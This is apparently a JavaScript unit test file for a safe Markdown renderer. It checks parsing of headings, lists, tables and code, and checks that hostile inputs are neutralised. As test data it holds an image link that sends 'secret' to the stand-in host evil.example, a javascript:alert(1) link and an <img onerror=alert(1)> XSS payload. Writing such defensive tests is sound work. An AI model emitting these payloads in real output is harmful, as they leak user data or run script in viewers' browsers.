import test from 'node:test';
import assert from 'node:assert/strict';
import { parseMarkdown, parseInline, isSafeHref } from './safeMarkdown.js';

test('headings, paragraphs and lists', () => {
    const blocks = parseMarkdown('## 結論\nCPU 高\n第二行\n\n- a\n- **b**\n\n1. one\n2. two');
    assert.equal(blocks[0].type, 'heading');
    assert.equal(blocks[0].level, 2);
    assert.deepEqual(blocks[1], { type: 'paragraph', children: [{ type: 'text', value: 'CPU 高\n第二行' }] });
    assert.equal(blocks[2].type, 'list');
    assert.equal(blocks[2].ordered, false);
    assert.deepEqual(blocks[2].items[1], [{ type: 'strong', children: [{ type: 'text', value: 'b' }] }]);
    assert.equal(blocks[3].ordered, true);
    assert.equal(blocks[3].items.length, 2);
});

test('fenced code blocks keep raw content', () => {
    const blocks = parseMarkdown('```powershell\nGet-Process | sort CPU\n**not bold**\n```');
    assert.deepEqual(blocks[0], { type: 'code', lang: 'powershell', value: 'Get-Process | sort CPU\n**not bold**' });
});

test('tables', () => {
    const blocks = parseMarkdown('| 指標 | 值 |\n|---|---:|\n| CPU | 97% |\n| Mem | `60%` |');
    assert.equal(blocks[0].type, 'table');
    assert.deepEqual(blocks[0].header[0], [{ type: 'text', value: '指標' }]);
    assert.deepEqual(blocks[0].rows[1][1], [{ type: 'code', value: '60%' }]);
});

test('images are never rendered', () => {
    const inl = parseInline('see ![leak](http://evil.example/x.png?d=secret) here');
    assert.ok(!JSON.stringify(inl).includes('evil.example'));
    assert.ok(inl.every(n => n.type === 'text'));
});

test('only internal links become links', () => {
    assert.deepEqual(parseInline('[runbooks](/runbook)'), [{ type: 'link', href: '/runbook', children: [{ type: 'text', value: 'runbooks' }] }]);
    const ext = parseInline('[click](https://evil.example)');
    assert.equal(ext.some(n => n.type === 'link'), false);
    assert.equal(parseInline('[x](javascript:alert(1))').some(n => n.type === 'link'), false);
    assert.equal(isSafeHref('//evil.example'), false);
    assert.equal(isSafeHref('/a b'), false);
});

test('inline code, emphasis and raw HTML stays text', () => {
    assert.deepEqual(parseInline('`a*b*` and *em*'), [
        { type: 'code', value: 'a*b*' }, { type: 'text', value: ' and ' }, { type: 'em', children: [{ type: 'text', value: 'em' }] },
    ]);
    assert.deepEqual(parseInline('<img src=x onerror=alert(1)>'), [{ type: 'text', value: '<img src=x onerror=alert(1)>' }]);
});
